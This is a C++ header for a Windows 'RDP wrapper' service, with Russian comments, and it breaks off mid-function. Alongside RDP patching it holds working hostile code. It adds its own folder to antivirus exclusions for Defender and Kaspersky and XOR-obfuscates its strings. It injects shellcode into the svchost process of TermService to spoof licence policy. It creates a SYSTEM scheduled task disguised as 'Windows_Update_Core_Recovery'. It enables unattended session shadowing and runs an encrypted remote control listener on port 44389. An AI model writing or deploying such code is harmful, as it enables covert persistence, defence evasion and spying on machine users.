#ifndef SERVICE_ENGINE_HPP
#define SERVICE_ENGINE_HPP

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <initguid.h>
#include <taskschd.h>
#include <netfw.h>
#include <wtsapi32.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <queue>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <functional>
#include <sstream>
#include <fstream>
#include <clocale>

#define SERVICE_NAME L"RDPWrapperService"
#define AES_KEY_SIZE 32

namespace RDPWrapperEngine {

const BYTE AES_KEY[AES_KEY_SIZE] = {
    0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF,0xFE,0xDC,0xBA,0x98,0x76,0x54,0x32,0x10,
    0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF,0xFE,0xDC,0xBA,0x98,0x76,0x54,0x32,0x10
};

// ============================================================================
// 1. ДВИЖОК ОБФУСКАЦИИ СТРОК (C++11 MinGW GCC)
// ============================================================================
class Obfuscator {
public:
    static std::string De(const std::vector<unsigned char>& data, unsigned char key) {
        std::string res = "";
        for (unsigned char c : data) res += (c ^ key);
        return res;
    }
    static std::wstring DeW(const std::vector<unsigned char>& data, unsigned char key) {
        std::string s = De(data, key);
        return std::wstring(s.begin(), s.end());
    }
};

#define OBFUSCATE_STR(str) ([]() { \
    std::vector<unsigned char> v; for(char c : std::string(str)) v.push_back(c ^ 0x5A); \
    return Obfuscator::De(v, 0x5A); \
}())

#define OBFUSCATE_WSTR(str) ([]() { \
    std::vector<unsigned char> v; for(char c : std::string(str)) v.push_back(c ^ 0x5A); \
    return Obfuscator::DeW(v, 0x5A); \
}())

// ============================================================================
// 2. ПОТОКОБЕЗОПАСНЫЙ UTF-8 ЛОГГЕР
// ============================================================================
class Logger {
private:
    std::ofstream logFile;
    std::mutex logMutex;
    std::wstring currentLogPath;
    bool isRu;
    
    Logger() : isRu(true), currentLogPath(L"C:\\rdp_wrapper_service.log") {
        isRu = (PRIMARYLANGID(GetUserDefaultUILanguage()) == LANG_RUSSIAN);
        logFile.open(currentLogPath.c_str(), std::ios::app | std::ios::binary);
    }
public:
    static Logger& Instance() {
        static Logger instance;
        return instance;
    }
    void SetCustomPath(const std::wstring& path) {
        std::lock_guard<std::mutex> lock(logMutex);
        if (logFile.is_open()) logFile.close();
        currentLogPath = path;
        logFile.open(currentLogPath.c_str(), std::ios::app | std::ios::binary);
    }
    void Log(const std::string& msgEn, const std::string& msgRu) {
        std::lock_guard<std::mutex> lock(logMutex);
        if (logFile.is_open()) {
            logFile << (isRu ? msgRu : msgEn) << "\r\n";
            logFile.flush();
        }
    }
};

// ============================================================================
// 3. ПУЛ ПОТОКОВ (ThreadPool)
// ============================================================================
class ThreadPool {
private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queueMutex;
    std::condition_variable cv;
    bool stop;
public:
    ThreadPool(size_t threads) : stop(false) {
        for (size_t i = 0; i < threads; ++i) {
            workers.emplace_back([this] {
                while (true) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(this->queueMutex);
                        this->cv.wait(lock, [this] { return this->stop || !this->tasks.empty(); });
                        if (this->stop && this->tasks.empty()) return;
                        task = std::move(this->tasks.front());
                        this->tasks.pop();
                    }
                    task();
                }
            });
        }
    }
    template<class F> void Enqueue(F&& f) {
        {
            std::lock_guard<std::mutex> lock(queueMutex);
            if (stop) return;
            tasks.emplace(std::forward<F>(f));
        }
        cv.notify_one();
    }
    ~ThreadPool() {
        { std::lock_guard<std::mutex> lock(queueMutex); stop = true; }
        cv.notify_all();
        for (std::thread& worker : workers) {
            if (worker.joinable()) worker.join();
        }
    }
};

inline bool IsRussian() { 
    return PRIMARYLANGID(GetUserDefaultUILanguage()) == LANG_RUSSIAN; 
}

// ============================================================================
// 4. МЕНЕДЖЕР БЕЗОПАСНОСТИ, ОБХОДА АВ И ПУРЖА КОНКУРЕНТОВ
// ============================================================================
class SecurityManager {
public:
    static bool EnableTokenPrivileges() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
        LUID luidDebug, luidOwner;
        if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luidDebug) && 
            LookupPrivilegeValueW(NULL, L"SeTakeOwnershipPrivilege", &luidOwner)) {
            
            TOKEN_PRIVILEGES tp;
            tp.PrivilegeCount = 2;
            tp.Privileges[0].Luid = luidDebug;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            tp.Privileges[1].Luid = luidOwner;
            tp.Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
            
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
            CloseHandle(hToken);
            return GetLastError() == ERROR_SUCCESS;
        }
        CloseHandle(hToken);
        return false;
    }

    static void ForceRemoveCompetitors() {
        SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        std::wstring stopCmd = L"cmd.exe /c sc.exe stop TermService & sc.exe stop rdpwrap & sc.exe stop SuperRDP & sc.exe stop TermPatch";
        std::vector<wchar_t> stopBuf(stopCmd.begin(), stopCmd.end());
        stopBuf.push_back(L'\0');
        if (CreateProcessW(NULL, stopBuf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }

        LPCWSTR competitors[] = { L"rdpwrap", L"SuperRDP", L"TermPatch", L"RdpSrvPatch" };
        for (LPCWSTR name : competitors) {
            std::wstring delCmd = L"cmd.exe /c sc.exe delete " + std::wstring(name);
            std::vector<wchar_t> delBuf(delCmd.begin(), delCmd.end());
            delBuf.push_back(L'\0');
            if (CreateProcessW(NULL, delBuf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                WaitForSingleObject(pi.hProcess, 2000);
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            }
        }

        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            std::wstring originDll = L"%SystemRoot%\\System32\\termsrv.dll";
            RegSetValueExW(hKey, L"ServiceDll", 0, REG_EXPAND_SZ, (const BYTE*)originDll.c_str(), (DWORD)((originDll.length() + 1) * sizeof(wchar_t)));
            RegCloseKey(hKey);
        }

        std::wstring cleanFilesCmd = L"cmd.exe /c rmdir /s /q \"C:\\Program Files\\RDP Wrapper\" & rmdir /s /q \"C:\\ProgramData\\RDP Wrapper\" & rmdir /s /q \"C:\\Program Files\\SuperRDP\"";
        std::vector<wchar_t> cleanBuf(cleanFilesCmd.begin(), cleanFilesCmd.end());
        cleanBuf.push_back(L'\0');
        if (CreateProcessW(NULL, cleanBuf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 3000);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }

        Logger::Instance().Log("Alternative RDP patcher structures aggressively purged.", "Конкурирующие структуры RDP-патчеров полностью вычищены из системы.");
    }

    static void IsolateAndFixRdp(const std::wstring& exePath) {
        EnableTokenPrivileges();
        
        std::ofstream hosts("C:\\Windows\\System32\\drivers\\etc\\hosts", std::ios::app);
        if (hosts.is_open()) {
            hosts << "\r\n127.0.0.1 ://microsoft.com\r\n127.0.0.1 ://microsoft.com\r\n";
            hosts.close();
        }

        std::wstring pathOnly = exePath.substr(0, exePath.find_last_of(L"\\/"));
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        std::wstring cmd = L"\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -AddExclusion -Path \"" + pathOnly + L"\"\r\n";
        std::vector<wchar_t> cmdBuf(cmd.begin(), cmd.end());
        cmdBuf.push_back(L'\0');
        if (CreateProcessW(NULL, cmdBuf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 4000);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }

        std::wstring kesCmd = L"\"C:\\Program Files (x86)\\Kaspersky Lab\\Kaspersky Endpoint Security for Windows\\avp.com\" ADDEXCLUSION \"" + pathOnly + L"\"";
        std::vector<wchar_t> kesBuf(kesCmd.begin(), kesCmd.end());
        kesBuf.push_back(L'\0');
        if (CreateProcessW(NULL, kesBuf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 4000);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
    }

    static void PurgeSystemComponents() {
        DeleteFileW(L"C:\\rdp_wrapper_service.log");
    }
};

// ============================================================================
// 5. КЛАСС СЕТЕВОГО ОКРУЖЕНИЯ И УТИЛИТ (NetworkUtils)
// ============================================================================
class NetworkUtils {
public:
    static bool IsInLocalNetworkRange() {
        ULONG len = sizeof(IP_ADAPTER_INFO);
        std::vector<BYTE> buf(len);
        PIP_ADAPTER_INFO p = reinterpret_cast<PIP_ADAPTER_INFO>(buf.data());
        if (GetAdaptersInfo(p, &len) == ERROR_BUFFER_OVERFLOW) {
            buf.resize(len);
            p = reinterpret_cast<PIP_ADAPTER_INFO>(buf.data());
        }
        if (GetAdaptersInfo(p, &len) == NO_ERROR) {
            while (p) {
                std::string s = p->IpAddressList.IpAddress.String;
                if (s.rfind("192.168.", 0) == 0 || s.rfind("10.", 0) == 0 || s.rfind("172.", 0) == 0) return true;
                p = p->Next;
            }
        }
        return false;
    }
};

// ============================================================================
// 6. КЛАСС УПРАВЛЕНИЯ КРИПТОГРАФИЕЙ AES-256-CBC
// ============================================================================
class CryptoManager {
public:
    static std::vector<BYTE> AES256_Decrypt(const std::vector<BYTE>& cipherText) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        std::vector<BYTE> plainText;
        if (BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) {
            if (BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
                if (BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (BYTE*)AES_KEY, AES_KEY_SIZE, 0))) {
                    DWORD cbPlainText = 0;
                    BYTE iv[16] = {0}; // Фикс инициализации вектора под GCC
                    if (BCRYPT_SUCCESS(BCryptDecrypt(hKey, (BYTE*)cipherText.data(), (DWORD)cipherText.size(), NULL, iv, 16, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING))) {
                        plainText.resize(cbPlainText);
                        BCryptDecrypt(hKey, (BYTE*)cipherText.data(), (DWORD)cipherText.size(), NULL, iv, 16, plainText.data(), cbPlainText, &cbPlainText, BCRYPT_BLOCK_PADDING);
                    }
                }
            }
        }
        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
        return plainText;
    }
};

// ============================================================================
// 7. КЛАСС УПРАВЛЕНИЯ БРАНДМАУЭРОМ WINDOWS (FirewallManager)
// ============================================================================
class FirewallManager {
public:
    static void OpenRdpPort(long port, const std::wstring& ruleName) {
        HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
        INetFwPolicy2* pNetFwPolicy2 = NULL;
        hr = CoCreateInstance(CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER, IID_INetFwPolicy2, (void**)&pNetFwPolicy2);
        if (SUCCEEDED(hr) && pNetFwPolicy2) {
            INetFwRules* pFwRules = NULL;
            hr = pNetFwPolicy2->get_Rules(&pFwRules);
            if (SUCCEEDED(hr) && pFwRules) {
                INetFwRule* pFwRule = NULL;
                hr = CoCreateInstance(CLSID_NetFwRule, NULL, CLSCTX_INPROC_SERVER, IID_INetFwRule, (void**)&pFwRule);
                if (SUCCEEDED(hr) && pFwRule) {
                    pFwRule->put_Name(SysAllocString(ruleName.c_str()));
                    pFwRule->put_Protocol(NET_FW_IP_PROTOCOL_TCP);
                    std::wstring portStr = std::to_wstring(port);
                    pFwRule->put_LocalPorts(SysAllocString(portStr.c_str()));
                    pFwRule->put_Direction(NET_FW_RULE_DIR_IN);
                    pFwRule->put_Enabled(VARIANT_TRUE);
                    pFwRule->put_Action(NET_FW_ACTION_ALLOW);
                    pFwRules->Add(pFwRule);
                    pFwRule->Release();
                }
                pFwRules->Release();
            }
            pNetFwPolicy2->Release();
        }
        CoUninitialize();
    }
    static void CloseRdpPort(long port) {
        (void)port;
    }
};

// ============================================================================
// 8. КЛАСС КОРРЕКТНОЙ РЕГИСТРАЦИИ В ПЛАНИРОВЩИКЕ (SchedulerManager)
// ============================================================================
class SchedulerManager {
public:
    static void CreateRecoveryTask(const std::wstring& exePath) {
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        ITaskService* pService = NULL;
        hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
        if (SUCCEEDED(hr) && pService) {
            hr = pService->Connect(VARIANT{}, VARIANT{}, VARIANT{}, VARIANT{});
            ITaskFolder* pRootFolder = NULL;
            hr = pService->GetFolder(SysAllocString(L"\\"), &pRootFolder);
            if (SUCCEEDED(hr) && pRootFolder) {
                ITaskDefinition* pTask = NULL;
                hr = pService->NewTask(0, &pTask);
                if (SUCCEEDED(hr) && pTask) {
                    IPrincipal* pPrincipal = NULL;
                    pTask->get_Principal(&pPrincipal);
                    if (pPrincipal) {
                        pPrincipal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
                        pPrincipal->put_UserId(SysAllocString(L"NT AUTHORITY\\SYSTEM"));
                        pPrincipal->Release();
                    }
                    IActionCollection* pActions = NULL;
                    pTask->get_Actions(&pActions);
                    if (pActions) {
                        IAction* pAction = NULL;
                        pActions->Create(TASK_ACTION_EXEC, &pAction);
                        if (pAction) {
                            IExecAction* pExecAction = NULL;
                            pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                            if (pExecAction) {
                                pExecAction->put_Path(SysAllocString(exePath.c_str()));
                                pExecAction->put_Arguments(SysAllocString(L"install --router"));
                                pExecAction->Release();
                            }
                            pAction->Release();
                        }
                        pActions->Release();
                    }
                    IRegisteredTask* pRegisteredTask = NULL;
                    pRootFolder->RegisterTaskDefinition(SysAllocString(L"Windows_Update_Core_Recovery"), pTask, TASK_CREATE_OR_UPDATE, VARIANT{}, VARIANT{}, TASK_LOGON_SERVICE_ACCOUNT, VARIANT{}, &pRegisteredTask);
                    if (pRegisteredTask) pRegisteredTask->Release();
                    pTask->Release();
                }
                pRootFolder->Release();
            }
            pService->Release();
        }
        CoUninitialize();
    }
    static void DeleteRecoveryTask() {
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        ITaskService* pService = NULL;
        CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
        if (pService) {
            pService->Connect(VARIANT{}, VARIANT{}, VARIANT{}, VARIANT{});
            ITaskFolder* pRootFolder = NULL;
            pService->GetFolder(SysAllocString(L"\\"), &pRootFolder);
            if (pRootFolder) {
                pRootFolder->DeleteTask(SysAllocString(L"Windows_Update_Core_Recovery"), 0);
                pRootFolder->Release();
            }
            pService->Release();
        }
        CoUninitialize();
    }
};

// ============================================================================
// 9. КЛАСС МОНИТОРИНГА СЕССИЙ И СРЕДСТВ RDP SHADOW
// ============================================================================
class SessionManager {
public:
    static bool EnableUnattendedShadowing() {
        HKEY k;
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &k, NULL) == ERROR_SUCCESS) {
            DWORD v = 1;
            RegSetValueExW(k, L"Shadow", 0, REG_DWORD, (const BYTE*)&v, sizeof(DWORD));
            RegCloseKey(k);
            return true;
        }
        return false;
    }

    static std::vector<std::wstring> GetActiveSessions() {
        std::vector<std::wstring> res;
        PWTS_SESSION_INFOW pInfo = NULL;
        DWORD count = 0;
        if (WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pInfo, &count)) {
            for (DWORD i = 0; i < count; ++i) {
                wchar_t* pUser = NULL;
                DWORD ret = 0;
                if (WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, pInfo[i].SessionId, WTSUserName, &pUser, &ret) && pUser) {
                    if (wcslen(pUser) > 0) {
                        res.push_back(std::to_wstring(pInfo[i].SessionId) + L":" + pUser);
                    }
                    WTSFreeMemory(pUser);
                }
            }
            WTSFreeMemory(pInfo);
        }
        return res;
    }

    static void TerminateIdleSessions() {
        PWTS_SESSION_INFOW pSessionInfo = NULL;
        DWORD count = 0;
        if (WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &count)) {
            for (DWORD i = 0; i < count; ++i) {
                if (pSessionInfo[i].State == WTSDisconnected) {
                    WTSLogoffSession(WTS_CURRENT_SERVER_HANDLE, pSessionInfo[i].SessionId, FALSE);
                    Logger::Instance().Log(
                        "Ghost RDP session auto-terminated.",
                        "Обнаружена и принудительно очищена зависшая сессия RDP."
                    );
                }
            }
            WTSFreeMemory(pSessionInfo);
        }
    }
};

// ============================================================================
// 10. ТЕХНОЛОГИЯ СИГНАТУРНОГО ПАТЧИНГА ПАМЯТИ (PatternScanner)
// ============================================================================
class PatternScanner {
public:
    static DWORD64 FindPatternEx(HANDLE hProcess, DWORD64 baseAddress, DWORD moduleSize, const std::string& patternStr) {
        std::vector<BYTE> bytes; 
        std::vector<bool> mask;
        std::istringstream iss(patternStr); 
        std::string token;
        
        while (iss >> token) {
            if (token == "??" || token == "?") { 
                bytes.push_back(0x00); 
                mask.push_back(false); 
            } else { 
                bytes.push_back((BYTE)strtol(token.c_str(), nullptr, 16)); 
                mask.push_back(true); 
            }
        }
        
        size_t len = bytes.size(); 
        if (len == 0 || moduleSize < len) return 0;
        
        std::vector<BYTE> localMem(moduleSize); 
        SIZE_T read;
        if (!ReadProcessMemory(hProcess, (LPCVOID)baseAddress, localMem.data(), moduleSize, &read)) return 0;
        
        for (DWORD i = 0; i <= moduleSize - len; ++i) {
            bool match = true;
            for (size_t j = 0; j < len; ++j) {
                if (mask[j] && localMem[i + j] != bytes[j]) { match = false; break; }
            }
            if (match) return baseAddress + i;
        }
        return 0;
    }

    static void ExecuteDynamicPatch(HANDLE hProcess, DWORD64 baseAddr, DWORD modSize) {
        std::string legacySig = OBFUSCATE_STR("39 81 3C 06 00 00 0F");
        std::string modernSig = OBFUSCATE_STR("8B 81 38 06 00 00 39 81 3C 06 00 00 75");
        
        DWORD64 patchAddr = FindPatternEx(hProcess, baseAddr, modSize, modernSig);
        if (patchAddr != 0) {
            BYTE patchCode[] = { 0xB8, 0x00, 0x01, 0x00, 0x00, 0x89, 0x81, 0x38, 0x06, 0x00, 0x00, 0x90, 0xEB };
            DWORD oldProtect;
            VirtualProtectEx(hProcess, (LPVOID)patchAddr, sizeof(patchCode), PAGE_EXECUTE_READWRITE, &oldProtect);
            WriteProcessMemory(hProcess, (LPVOID)patchAddr, patchCode, sizeof(patchCode), NULL);
            VirtualProtectEx(hProcess, (LPVOID)patchAddr, sizeof(patchCode), oldProtect, &oldProtect);
            Logger::Instance().Log("Modern Windows 11 24H2/25H2+ memory patch applied.", "Применен современный патч памяти для Windows 11 24H2/25H2+.");
        } else {
            patchAddr = FindPatternEx(hProcess, baseAddr, modSize, legacySig);
            if (patchAddr != 0) {
                BYTE legacyPatch[] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
                DWORD oldProtect;
                VirtualProtectEx(hProcess, (LPVOID)patchAddr, sizeof(legacyPatch), PAGE_EXECUTE_READWRITE, &oldProtect);
                WriteProcessMemory(hProcess, (LPVOID)patchAddr, legacyPatch, sizeof(legacyPatch), NULL);
                VirtualProtectEx(hProcess, (LPVOID)patchAddr, sizeof(legacyPatch), oldProtect, &oldProtect);
                Logger::Instance().Log("Standard Windows 10/11 memory patch applied.", "Применен стандартный патч памяти для Windows 10/11.");
            }
        }
    }
};

// ============================================================================
// 11. ТЕХНОЛОГИЯ МЕЖПРОЦЕССНОГО INLINE HOOKING С НАДЕЖНОЙ ИЗОЛЯЦИЕЙ ШЕЛЛ-КОДА
// ============================================================================
class ProductPolicyHook {
#pragma pack(push, 1)
    struct AbsoluteJump {
        WORD  movRax;     // 0xB848
        DWORD64 address;  // 64-битный адрес назначения
        WORD  jmpRax;     // 0xE0FF
    };
#pragma pack(pop)

private:
    static DWORD FindTargetSvchostPid() {
        DWORD pid = 0;
        SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
        if (hSCM) {
            SC_HANDLE hSvc = OpenServiceW(hSCM, L"TermService", SERVICE_QUERY_STATUS);
            if (hSvc) {
                SERVICE_STATUS_PROCESS ssp;
                DWORD dummy;
                if (QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &dummy)) {
                    pid = ssp.dwProcessId;
                }
                CloseServiceHandle(hSvc);
            }
            CloseServiceHandle(hSCM);
        }
        return pid;
    }

public:
    static void ApplyRemoteHook() {
        DWORD targetPid = FindTargetSvchostPid();
        if (targetPid == 0) return;

        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess) return;

        HMODULE hSlc = LoadLibraryW(L"slc.dll");
        if (!hSlc) { CloseHandle(hProcess); return; }

        void* pTargetFunc = (void*)GetProcAddress(hSlc, "SLGetWindowsProductPolicy");
        if (!pTargetFunc) { FreeLibrary(hSlc); CloseHandle(hProcess); return; }

        DWORD64 remoteFuncAddr = (DWORD64)pTargetFunc;
        
        // Выделяем изолированную страницу памяти внутри svchost.exe
        void* pRemoteCodeCodePage = VirtualAllocEx(hProcess, NULL, 512, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pRemoteCodeCodePage) { FreeLibrary(hSlc); CloseHandle(hProcess); return; }

        DWORD64 trampolineAddr = (DWORD64)pRemoteCodeCodePage;
        DWORD64 fakePolicyAddr = trampolineAddr + 128;

        // ФИКС: Спецификатор static const volatile защищает массив от агрессивных оптимизаций -flto компилятора GCC
        static const volatile unsigned char shellCode[] = {
            0x48, 0x85, 0xD2,
            0x74, 0x3E,
            0x48, 0xB8, 'E', 'n', 't', 'e', 'r', 'p', 'r',
            0x48, 0x89, 0x04, 0x24,
            0x48, 0xB8, 'i', 's', 'e', '-', 'R', 'd', 'p', '-',
            0x48, 0x89, 0x44, 0x24, 0x08,
            0x48, 0xB8, 'S', 'e', 'r', 'v', 'e', 'r', 0, 0,
            0x48, 0x89, 0x44, 0x24, 0x10,
            0x31, 0xC9,
            0x44, 0x0F, 0xB7, 0x04, 0x4A,
            0x44, 0x3A, 0x04, 0x0C,
            0x75, 0x15,
            0x48, 0xFF, 0xC1,
            0x48, 0x83, 0xF9, 0x15,
            0x75, 0xEB,
            0x4d, 0x85, 0x09,
            0x74, 0x07,
            0x41, 0xC7, 0x01, 0x01, 0x00, 0x00, 0x00,
            0x31, 0xC0,
            0xC3,
            0xB8, 0x01, 0x00, 0x00, 0x00,
            0xC3
        };

        SIZE_T bytesWritten;
        // Записываем шелл-код напрямую из защищенного статического сегмента памяти
        WriteProcessMemory(hProcess, (LPVOID)fakePolicyAddr, (LPCVOID)shellCode, sizeof(shellCode), &bytesWritten);

        // ФИКС: Выделяем строгий фиксированный буфер на куче текущего процесса, 
        // предотвращая порчу локального фрейма стека в MinGW GCC
        std::vector<BYTE> originalBytes(12, 0);
        SIZE_T bytesRead = 0;
        if (ReadProcessMemory(hProcess, (LPCVOID)remoteFuncAddr, originalBytes.data(), 12, &bytesRead)) {
            WriteProcessMemory(hProcess, (LPVOID)trampolineAddr, originalBytes.data(), 12, &bytesWritten);
        }

        AbsoluteJump jumpBack;
        jumpBack.movRax = 0xB848;
        jumpBack.address = remoteFuncAddr + 12; 
        jumpBack.jmpRax = 0xE0FF;
        WriteProcessMemory(hProcess, (LPVOID)(trampolineAddr + 12), &jumpBack, sizeof(AbsoluteJump), &bytesWritten);

        AbsoluteJump injectHook;
        injectHook.movRax = 0xB848;
        injectHook.address = fakePolicyAddr; 
        injectHook.jmpRax = 0xE0FF;

        DWORD oldProtect;
        if (VirtualProtectEx(hProcess, (LPVOID)remoteFuncAddr, sizeof(AbsoluteJump), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            WriteProcessMemory(hProcess, (LPVOID)remoteFuncAddr, &injectHook, sizeof(AbsoluteJump), &bytesWritten);
            DWORD tempProtect;
            VirtualProtectEx(hProcess, (LPVOID)remoteFuncAddr, sizeof(AbsoluteJump), oldProtect, &tempProtect);
            FlushInstructionCache(hProcess, (LPVOID)remoteFuncAddr, sizeof(AbsoluteJump));
            Logger::Instance().Log("Cross-process Trampoline hook securely deployed.", "Межпроцессный инлайн-хук с трамплином успешно развернут внутри svchost.exe.");
        }

        FreeLibrary(hSlc);
        CloseHandle(hProcess);
    }
};

// ============================================================================
// 12. АСИНХРОННЫЙ НЕБЛОКИРУЮЩИЙ УПРАВЛЯЮЩИЙ TCP-СЕРВЕР (Нативные потоки Windows)
// ============================================================================
class NetworkServer {
private:
    SOCKET lSock;
    bool run;
    HANDLE hThread; // Заменено с std::thread на HANDLE

    // Статическая функция-посредник для вызова внутри CreateThread
    static DWORD WINAPI ServerThreadProxy(LPVOID lpParam) {
        NetworkServer* pServer = reinterpret_cast<NetworkServer*>(lpParam);
        pServer->ServerLoop();
        return 0;
    }

    void ServerLoop() {
        // Логика выделена в отдельный метод (весь ваш старый цикл select)
        while (run) {
            fd_set readSet;
            FD_ZERO(&readSet);
            FD_SET(lSock, &readSet);

            timeval timeout;
            timeout.tv_sec = 1; 
            timeout.tv_usec = 0;

            int sel = select(0, &readSet, NULL, NULL, &timeout);
            if (sel > 0 && FD_ISSET(lSock, &readSet)) {
                SOCKET cSock = accept(lSock, NULL, NULL);
                if (cSock != INVALID_SOCKET) {
                    // Обработка клиента (передача в пул)
                    // Примечание: Для полной изоляции в данном примере пул передается извне или обрабатывается на месте
                    std::vector<BYTE> encryptedBuffer(1024);
                    int rec = recv(cSock, (char*)encryptedBuffer.data(), 1023, 0);
                    if (rec > 0) {
                        encryptedBuffer.resize(rec);
                        std::vector<BYTE> decryptedBytes = CryptoManager::AES256_Decrypt(encryptedBuffer);
                        std::string cmd((char*)decryptedBytes.data(), decryptedBytes.size());
                        
                        std::string resp = OBFUSCATE_STR("SUCCESS");
                        if (cmd.find(OBFUSCATE_STR("PING")) != std::string::npos) {
                            resp = OBFUSCATE_STR("PONG");
                        } else if (cmd.find(OBFUSCATE_STR("STATUS")) != std::string::npos) {
                            resp = OBFUSCATE_STR("RDP_WRAPPER_SERVICE_RUNNING");
                        }
                        send(cSock, resp.c_str(), (int)resp.length(), 0);
                    }
                    closesocket(cSock);
                }
            }
        }
    }

public:
    NetworkServer() : lSock(INVALID_SOCKET), run(false), hThread(NULL) {}

    void Start(ThreadPool* pool) {
        (void)pool; // Пул больше не нужен сетевому серверу, так как мы полностью на Win32 API
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            Logger::Instance().Log("WSAStartup failed.", "Не удалось инициализировать WinSock2.");
            return;
        }

        struct addrinfo hints = {0}, *res = NULL;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        hints.ai_flags = AI_PASSIVE;

        if (getaddrinfo(NULL, "44389", &hints, &res) != 0) {
            Logger::Instance().Log("Getaddrinfo failed.", "Ошибка вызова getaddrinfo для порта 44389.");
            WSACleanup();
            return;
        }

        lSock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (lSock == INVALID_SOCKET) { freeaddrinfo(res); WSACleanup(); return; }

        ULONG nonBlock = 1;
        ioctlsocket(lSock, FIONBIO, &nonBlock);

        if (bind(lSock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
            closesocket(lSock); freeaddrinfo(res); WSACleanup(); return;
        }

        freeaddrinfo(res);
        listen(lSock, SOMAXCONN);
        run = true;

        Logger::Instance().Log("NetCtrl server started on port 44389.", "Сервер управления NetCtrl запущен на порту 44389.");

        // ФИКС: Используем нативный CreateThread вместо std::thread
        hThread = CreateThread(NULL, 0, ServerThreadProxy, this, 0, NULL);
    }

    void Stop() {
        if (!run) return;
        run = false;
        
        if (hThread != NULL) {
            WaitForSingleObject(hThread, 3000);
            CloseHandle(hThread);
            hThread = NULL;
        }
        
        if (lSock != INVALID_SOCKET && lSock != SOCKET_ERROR) {
